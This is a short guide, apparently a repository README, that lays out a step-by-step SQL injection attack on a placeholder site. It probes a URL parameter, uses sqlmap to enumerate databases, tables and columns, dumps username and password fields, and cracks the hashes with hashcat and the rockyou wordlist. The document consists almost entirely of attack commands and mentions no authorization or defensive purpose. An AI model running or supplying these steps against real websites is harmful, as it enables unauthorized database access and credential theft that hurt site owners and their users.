# SQLmap-to-Attack-a-Website
SQLmap to Attack a Website Guide


|Identify a Vulnerable Website|

 http://target.com/index.php?id=1
  ~ manually test for SQL injection
    http://target.com/index.php?id=1'
    
|Run SQLmap to Detect SQL Injection|

  sqlmap -u "http://target.com/index.php?id=1" --dbs

|Extract Tables from a Database|

  sqlmap -u "http://target.com/index.php?id=1" -D users_db --tables

|Extract Columns from a Table|

  sqlmap -u "http://target.com/index.php?id=1" -D users_db -T users --columns

|Dump Data (Usernames and Passwords)|

  sqlmap -u "http://target.com/index.php?id=1" -D users_db -T users -C username,password --dump

|Crack Hashed Passwords |

  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

